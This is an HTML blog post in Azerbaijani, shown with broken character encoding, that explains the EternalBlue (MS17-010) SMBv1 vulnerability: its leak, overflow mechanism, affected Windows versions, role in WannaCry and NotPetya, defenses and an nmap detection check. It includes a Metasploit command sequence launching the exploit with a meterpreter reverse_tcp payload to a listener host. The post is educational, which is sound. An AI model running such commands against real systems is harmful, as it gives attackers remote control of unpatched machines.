<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>POST #2 â€“ EternalBlue (MS17-010) DÉ™rin Analiz</title>
  <style>
    body {
      background-color: #000;
      color: #00ff00;
      font-family: 'Courier New', monospace;
      padding: 40px;
    }
    h1, h2 {
      color: #ff0033;
      text-shadow: 0 0 15px red;
    }
    .post-container {
      background: #111;
      padding: 30px;
      border-left: 5px solid #ff0033;
      box-shadow: 0 0 25px #ff0033;
    }
    .meta {
      color: #999;
      font-size: 0.9em;
      margin-bottom: 20px;
    }
    .code-block {
      background: #000;
      color: #00ff00;
      padding: 15px;
      margin: 20px 0;
      border: 1px solid #333;
      font-size: 0.9em;
      overflow-x: auto;
    }
    a {
      color: #ff0044;
    }
    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="post-container">
    <h1>ğŸ’£ EternalBlue (MS17-010) â€“ Kernel sÉ™viyyÉ™sindÉ™ sÄ±zma</h1>
    <p class="meta">Yazan: <strong>ISKOPISIX</strong> | Tarix: 07.06.2025 | Qovluq: <em>Exploit / Kernel Hacking</em></p>

    <h2>ğŸ§  NÉ™dir EternalBlue?</h2>
    <p>
        2017-ci ilin aprel ayÄ±nda, Shadow Brokers adlÄ± qaranlÄ±q bir haker qrupu, ABÅ Milli TÉ™hlÃ¼kÉ™sizlik AgentliyinÉ™ (NSA) mÉ™xsus olan mÉ™xfi istismar paketini sÄ±zdÄ±rdÄ±. Bu paketdÉ™ yer alan É™n tÉ™hlÃ¼kÉ™li istismarlardan biri EternalBlue (MS17-010) exploit idi.

        Bu exploit, Windows É™mÉ™liyyat sistemlÉ™rindÉ™ki SMBv1 (Server Message Block) protokolundakÄ± bir zÉ™iflikdÉ™n istifadÉ™ edÉ™rÉ™k sistemÉ™ uzaqdan, autentifikasiya olmadan daxil olmaÄŸa imkan verir.
    </p>

    <h2>âš ï¸ ZÉ™iflik NÉ™dir?</h2>
    <p>
        ZÉ™iflik, proqram tÉ™minatÄ± vÉ™ ya sistem dizaynÄ±ndakÄ± kritik Ã§atÄ±ÅŸmazlÄ±qdÄ±r ki, bu da hÃ¼cumÃ§ulara sistemin gÃ¶zlÉ™nilmÉ™z ÅŸÉ™kildÉ™ idarÉ™sini É™lÉ™ keÃ§irmÉ™k, mÉ™lumatlarÄ± oÄŸurlamaq vÉ™ ya zÉ™rÉ™rli fÉ™aliyyÉ™t gÃ¶stÉ™rmÉ™k imkanÄ± verir. EternalBlue zÉ™ifliyi bu anlayÄ±ÅŸÄ±n É™n qorxunc nÃ¼munÉ™lÉ™rindÉ™n biridir. Bu zÉ™iflik Microsoft-un SMBv1 (Server Message Block version 1) protokolundakÄ± yaddaÅŸÄ±n idarÉ™ olunmasÄ±nda olan buffer overflow sÉ™hvindÉ™n qaynaqlanÄ±r.

        SMBv1 protokolu ÅŸÉ™bÉ™kÉ™dÉ™ fayl, printer vÉ™ digÉ™r resurslarÄ±n paylaÅŸÄ±mÄ±nÄ± tÉ™min edir vÉ™ Windows É™mÉ™liyyat sistemlÉ™rinin É™sas hissÉ™sini tÉ™ÅŸkil edir. Lakin onun implementasiyasÄ±nda olan bu zÉ™iflik, hÃ¼cumÃ§uya crafted edilmiÅŸ (yÉ™ni xÃ¼susi hazÄ±rlanmÄ±ÅŸ) SMB paketlÉ™ri gÃ¶ndÉ™rÉ™rÉ™k sistem yaddaÅŸÄ±nda sÉ™rhÉ™dlÉ™ri aÅŸan dÉ™yiÅŸikliklÉ™r etmÉ™yÉ™ imkan yaradÄ±r. Bu da arbitrar kod icrasÄ±na (arbitrary code execution) gÉ™tirib Ã§Ä±xarÄ±r, yÉ™ni hÃ¼cumÃ§u sistemin istÉ™nilÉ™n hissÉ™sindÉ™ Ã¶z zÉ™rÉ™rli kodunu icra edÉ™ bilir.
        
        Æn kritik tÉ™rÉ™fi isÉ™ EternalBlue zÉ™ifliyinin kernel sÉ™viyyÉ™sindÉ™ iÅŸlÉ™mÉ™sidir. Kernel sÉ™viyyÉ™si É™mÉ™liyyat sisteminin É™n yÃ¼ksÉ™k icazÉ™ sÉ™viyyÉ™sidir vÉ™ burada kod icra etmÉ™k hÃ¼cumÃ§uya tam sistem nÉ™zarÉ™ti demÉ™kdir. HÃ¼cumÃ§u bu sÉ™viyyÉ™dÉ™ tam administrator hÃ¼quqlarÄ± ilÉ™ É™mÉ™liyyatlar apara, sistemdÉ™ arxa qapÄ±lar qura, mÉ™lumatlarÄ± oÄŸurlaya vÉ™ ya sistemi tamamilÉ™ sÄ±radan Ã§Ä±xara bilÉ™r.
        
        Bu zÉ™iflik, crafted edilmiÅŸ SMB paketlÉ™ri vasitÉ™silÉ™ hÉ™yata keÃ§irilir vÉ™ ona gÃ¶rÉ™ dÉ™ hÃ¼cum Ã¼Ã§Ã¼n istifadÉ™Ã§i mÃ¼daxilÉ™si tÉ™lÉ™b olunmur â€” yalnÄ±z hÉ™dÉ™f sistemin ÅŸÉ™bÉ™kÉ™ Ã¼zÉ™rindÉ™ aÃ§Ä±q SMBv1 portuna malik olmasÄ± kifayÉ™tdir. EternalBlue zÉ™ifliyi hÉ™m dÉ™ Ã¶zÃ¼nÃ¼ ÅŸÉ™bÉ™kÉ™ daxilindÉ™ digÉ™r sistemlÉ™rÉ™ yayÄ±la bilÉ™n bir worm kimi istifadÉ™ edilmÉ™sinÉ™ imkan verir ki, bu da kÃ¼tlÉ™vi vÉ™ sÃ¼rÉ™tli hÃ¼cumlara ÅŸÉ™rait yaradÄ±r.
        
        BelÉ™liklÉ™, EternalBlue zÉ™ifliyi sistemin É™n dÉ™rin tÉ™bÉ™qÉ™lÉ™rindÉ™ki buffer overflow sÉ™hvindÉ™n istifadÉ™ edÉ™rÉ™k, hÃ¼cumÃ§unun kernel sÉ™viyyÉ™sindÉ™ istÉ™nilÉ™n kodu icra etmÉ™sinÉ™ ÅŸÉ™rait yaradÄ±r. Bu zÉ™iflik, mÃ¼asir kibertÉ™hlÃ¼kÉ™sizlik tarixindÉ™ É™n tÉ™hlÃ¼kÉ™li vÉ™ daÄŸÄ±dÄ±cÄ± boÅŸluqlardan biri kimi qiymÉ™tlÉ™ndirilir.
    </p>

    <h2>ğŸ“ TÉ™sirÉ™ mÉ™ruz qalan sistemlÉ™r:</h2>
    <ul>
      <li>Windows XP / 7 / 8 / 10</li>
      <li>Windows Server 2003 / 2008 / 2012</li>
      <li>Patch edilmÉ™miÅŸ sistemlÉ™r (MS17-010 olmayanlar)</li>
    </ul>

    <h2>ğŸ› ï¸ Exploitin MexanizmasÄ±</h2>
    <p>EternalBlue aÅŸaÄŸÄ±dakÄ± mÉ™rhÉ™lÉ™lÉ™r Ã¼zrÉ™ iÅŸlÉ™yir:</p>
    <ol>
      <li><strong>SMB Connection:</strong>SMB BaÄŸlantÄ±sÄ±nÄ±n QurulmasÄ±
        Ä°lk addÄ±mda, hÃ¼cumÃ§u hÉ™dÉ™f sistemÉ™ ÅŸÉ™bÉ™kÉ™ Ã¼zÉ™rindÉ™n port 445 vasitÉ™silÉ™ SMB (Server Message Block) protokolu ilÉ™ É™laqÉ™ yaradÄ±r. SMB protokolu Windows sistemlÉ™rindÉ™ fayl vÉ™ digÉ™r resurslarÄ±n paylaÅŸÄ±lÄ±b idarÉ™ olunmasÄ± Ã¼Ã§Ã¼n istifadÉ™ olunur vÉ™ EternalBlue zÉ™ifliyi mÉ™hz SMBv1 versiyasÄ±nda mÃ¶vcuddur. Bu mÉ™rhÉ™lÉ™dÉ™ hÃ¼cumÃ§u hÉ™dÉ™f maÅŸÄ±na SMB sessiyasÄ± aÃ§araq onunla É™laqÉ™ni aktivlÉ™ÅŸdirir vÉ™ exploit Ã¼Ã§Ã¼n zÉ™ruri mÃ¼hiti tÉ™min edir. </li>


      <li><strong>Trans2 Request Overflow:</strong> Trans2 Request ilÉ™ Buffer Overflow Yaratmaq
        HÃ¼cumun É™sas hÉ™dÉ™fi buffer overflow zÉ™ifliyidir. EternalBlue, SMBv1 protokolundakÄ± "Trans2" (Transaction2) É™mri Ã§É™rÃ§ivÉ™sindÉ™ crafted edilmiÅŸ xÃ¼susi paketlÉ™r gÃ¶ndÉ™rÉ™rÉ™k hÉ™dÉ™f sistemin yaddaÅŸÄ±nda sÉ™rhÉ™d aÅŸÄ±mÄ± yaradÄ±r. Bu buffer overflow, server tÉ™rÉ™fdÉ™ yaddaÅŸÄ±n kernel stack sahÉ™sindÉ™ tutarsÄ±zlÄ±q yaradaraq sistemin normal yaddaÅŸ idarÉ™sini pozur. Bu mÉ™rhÉ™lÉ™ hÃ¼cumun tÉ™mÉ™lini tÉ™ÅŸkil edir vÉ™ hÃ¼cumÃ§unun yaddaÅŸda Ã¶z kodunu yerlÉ™ÅŸdirmÉ™si Ã¼Ã§Ã¼n imkan yaradÄ±r.</li>


      <li><strong>Shellcode Injection:</strong> Shellcode-in YaddaÅŸa Ä°njeksiya EdilmÉ™si
Buffer overflow vÉ™ziyyÉ™tindÉ™n sonra, hÃ¼cumÃ§u kernel stack Ã¼zÉ™rinÉ™ zÉ™rÉ™rli shellcode-u yerlÉ™ÅŸdirir. Shellcode - xÃ¼susi yazÄ±lmÄ±ÅŸ kompakt kod parÃ§asÄ±dÄ±r ki, mÉ™qsÉ™di sistemdÉ™ istÉ™nilÉ™n É™mÉ™liyyatÄ± hÉ™yata keÃ§irmÉ™kdir. Bu mÉ™rhÉ™lÉ™dÉ™ hÃ¼cumÃ§unun yerlÉ™ÅŸdirdiyi shellcode, sistemin icazÉ™lÉ™rini aÅŸaraq kernel sÉ™viyyÉ™sindÉ™ iÅŸlÉ™yir vÉ™ hÃ¼cumÃ§unun tam nÉ™zarÉ™tini tÉ™min edir. Shellcode kernel yaddaÅŸÄ±nda uÄŸurla yerlÉ™ÅŸdirildikdÉ™, hÃ¼cum Ã¼Ã§Ã¼n É™sas zÉ™ruri mÉ™rhÉ™lÉ™ tamamlanÄ±r.</li>


      <li><strong>RCE:</strong> Arbitrar Kodun SYSTEM Ä°cazÉ™lÉ™ri ilÉ™ Ä°crasÄ± (RCE)
        Shellcode kernel sÉ™viyyÉ™sindÉ™ icra olunduqdan sonra, hÃ¼cumÃ§u SYSTEM hÃ¼quqlarÄ± ilÉ™ istÉ™nilÉ™n kodu icra edÉ™ bilir. SYSTEM hÃ¼quqlarÄ± Windows É™mÉ™liyyat sistemindÉ™ É™n yÃ¼ksÉ™k icazÉ™ sÉ™viyyÉ™sidir vÉ™ bu sÉ™viyyÉ™dÉ™ tam idarÉ™etmÉ™ É™ldÉ™ etmÉ™k demÉ™kdir. Bu da hÃ¼cumÃ§unun hÉ™dÉ™f sistemdÉ™ arxa qapÄ±lar aÃ§masÄ±, mÉ™lumat oÄŸurlamasÄ±, É™lavÉ™ malware yerlÉ™ÅŸdirmÉ™si vÉ™ ya tam sistem nÉ™zarÉ™tini É™lÉ™ keÃ§irmÉ™si kimi tÉ™hlÃ¼kÉ™li É™mÉ™liyyatlar aparmasÄ±na imkan verir.</li>
    </ol>

    <h2>ğŸ’» Exploit MisalÄ± (Metasploit ilÉ™)</h2>
    <div class="code-block">
<pre>
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.100.8
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.9
set LPORT 4444
exploit
</pre>
    </div>

    <h2>ğŸ”¥ Real Ä°stifadÉ™</h2>
    <p>
        EternalBlue exploit-i kibertÉ™hlÃ¼kÉ™sizlik tarixindÉ™ É™n geniÅŸ vÉ™ daÄŸÄ±dÄ±cÄ± kiberhÃ¼cumlarda istifadÉ™ edilmiÅŸdir. 2017-ci ildÉ™ EternalBlue, xÃ¼susilÉ™ WannaCry vÉ™ NotPetya adlÄ± iki bÃ¶yÃ¼k ransomware hÃ¼cumunun É™sas vasitÉ™si olmuÅŸdur. Bu hÃ¼cumlar milyonlarla cihazÄ± yoluxduraraq, dÃ¶vlÉ™t qurumlarÄ±, ÅŸirkÉ™tlÉ™r vÉ™ mÃ¼xtÉ™lif infrastruktur obyektlÉ™rinin fÉ™aliyyÉ™tini ciddi ÅŸÉ™kildÉ™ poza bilmiÅŸdir.

        WannaCry ransomware-i 2017-ci ilin may ayÄ±nda sÃ¼rÉ™tlÉ™ yayÄ±laraq yÃ¼z minlÉ™rlÉ™ kompÃ¼terÉ™ yoluxdu. EternalBlue zÉ™ifliyindÉ™n istifadÉ™ etmÉ™klÉ™ ÅŸÉ™bÉ™kÉ™yÉ™ baÄŸlÄ± cihazlara avtomatik yayÄ±lÄ±rdÄ± vÉ™ yoluxdurulmuÅŸ sistemlÉ™ri bloklayaraq istifadÉ™Ã§ilÉ™rdÉ™n fidyÉ™ tÉ™lÉ™b edirdi. Bu hÃ¼cum, BÃ¶yÃ¼k Britaniya Milli SÉ™hiyyÉ™ XidmÉ™ti (NHS) kimi kritik qurumlarda xidmÉ™tlÉ™rin dayanmasÄ±na, É™mÉ™liyyatlarÄ±n lÉ™ÄŸvinÉ™ sÉ™bÉ™b oldu vÉ™ dÃ¼nya Ã¼zrÉ™ 200,000-dÉ™n Ã§ox sistem yoluxdu.
        
        NotPetya isÉ™ 2017-ci ilin iyununda baÅŸ verÉ™n daha daÄŸÄ±dÄ±cÄ± bir hÃ¼cum idi. EternalBlue-nun yanÄ±nda digÉ™r Ã¼sullardan da istifadÉ™ edÉ™rÉ™k, mÉ™qsÉ™d yalnÄ±z mÉ™lumatlarÄ± ÅŸifrÉ™lÉ™mÉ™k yox, hÉ™m dÉ™ onlarÄ± tamamilÉ™ silmÉ™k idi. Bu hÃ¼cum Ukrayna hÃ¶kumÉ™t orqanlarÄ±, enerji ÅŸirkÉ™tlÉ™ri vÉ™ beynÉ™lxalq korporasiyalara milyardlarla dollarlÄ±q zÉ™rÉ™r vurdu.
        
        Bu real hadisÉ™lÉ™r EternalBlue-nun tÉ™hlÃ¼kÉ™sinin nÉ™ qÉ™dÉ™r bÃ¶yÃ¼k olduÄŸunu ortaya qoydu. Microsoft artÄ±q 2017-ci ilin martÄ±nda MS17-010 tÉ™hlÃ¼kÉ™sizlik yamasÄ±nÄ± Ã§Ä±xarmÄ±ÅŸdÄ±, lakin bir Ã§ox sistemdÉ™ bu yenilÉ™mÉ™lÉ™r vaxtÄ±nda tÉ™tbiq edilmÉ™di vÉ™ hÃ¼cumlarÄ±n qarÅŸÄ±sÄ± alÄ±nmadÄ±. EternalBlue exploit-in geniÅŸ yayÄ±lmasÄ± ÅŸÉ™bÉ™kÉ™ tÉ™hlÃ¼kÉ™sizliyi tÉ™dbirlÉ™rinin gÃ¼clÉ™ndirilmÉ™sini, SMBv1 protokolunun deaktiv edilmÉ™sini vÉ™ mÃ¼tÉ™madi tÉ™hlÃ¼kÉ™sizlik yenilÉ™mÉ™lÉ™rinin vacibliyini gÃ¶stÉ™rdi.
        
        NÉ™ticÉ™dÉ™, EternalBlue-nun real hÉ™yatda tÉ™tbiqi yalnÄ±z texniki zÉ™ifliyin deyil, hÉ™m dÉ™ kibertÉ™hlÃ¼kÉ™sizlik sahÉ™sindÉ™ insan faktoru vÉ™ idarÉ™etmÉ™nin É™hÉ™miyyÉ™tini vurÄŸuladÄ±. Bu zÉ™iflik Ã¼zÉ™rindÉ™n baÅŸ verÉ™n hÃ¼cumlar, kiberhÃ¼cumlarÄ±n hÉ™m iqtisadi, hÉ™m dÉ™ sosial tÉ™sirinin nÉ™ qÉ™dÉ™r ciddi ola bilÉ™cÉ™yini gÃ¶stÉ™rdi.
    </p>

    <h2>ğŸ›¡ï¸ MÃ¼dafiÉ™ YollarÄ±</h2>
    <ul>
      <li><strong>MS17-010</strong> patchini tÉ™tbiq et (Windows Security Update - March 2017).</li>
      <li>SMBv1 protokolunu sistemdÉ™n tamamilÉ™ deaktiv et.</li>
      <li>445 TCP portunu firewall ilÉ™ baÄŸla.</li>
      <li>Network segmentation vÉ™ EDR ilÉ™ hÃ¼cumlarÄ±n qarÅŸÄ±sÄ±nÄ± al.</li>
    </ul>

    <h2>ğŸ“‚ ÆlavÉ™ AlÉ™tlÉ™r</h2>
    <ul>
      <li><strong>nmap -p445 --script smb-vuln-ms17-010</strong> ilÉ™ zÉ™iflik aÅŸkarlanmasÄ±</li>
      <li><strong>eternalblue-2.2.0.rb</strong> â€“ custom Ruby exploit</li>
      <li><strong>BlueKeep vÉ™ DoublePulsar</strong> ilÉ™ kombinasiya edilÉ™ bilÉ™r</li>
    </ul>

    <p><a href="index.html">â† Geri QayÄ±t</a></p>
  </div>
</body>
</html>
